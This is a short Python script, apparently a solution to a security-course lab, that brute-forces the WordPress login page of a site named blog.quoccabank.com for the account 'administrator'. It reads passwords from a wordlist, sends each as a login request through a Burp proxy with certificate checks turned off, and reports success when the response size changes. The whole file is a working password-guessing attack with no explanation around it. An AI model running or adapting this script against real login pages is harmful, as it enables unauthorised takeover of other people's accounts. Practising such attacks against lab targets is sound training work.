import requests
from urllib3.exceptions import InsecureRequestWarning
import time
# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.session() # This session object saves our settings for the lifetime of the script.
s.verify = False # Skip trying to verify TLS certs, due to Burp's CA.
s.proxies = {"https": "http://127.0.0.1:8080"} # Proxy requests through Burp.
base_url = "https://blog.quoccabank.com/wp-login.php"


# Load passwords from the text file
with open('passwords.txt', 'r') as password_file:
    passwords = password_file.read().splitlines()

# Loop over the passwords, trying to log in with each one
for password in passwords:
    # Set login data
    login_data = {
        'log': 'administrator',
        'pwd': password,
    }

    # Send a POST request with the login data
    response = s.post(base_url, data=login_data)

    # Check the response, if successful, print the password that worked
    if len(response.content) != 6195:
        print(f"Successful login with password: {password}")
        break  # Optional: remove this line if you want to continue trying even after a success
    else:
        print(f"Failed login with password: {password}")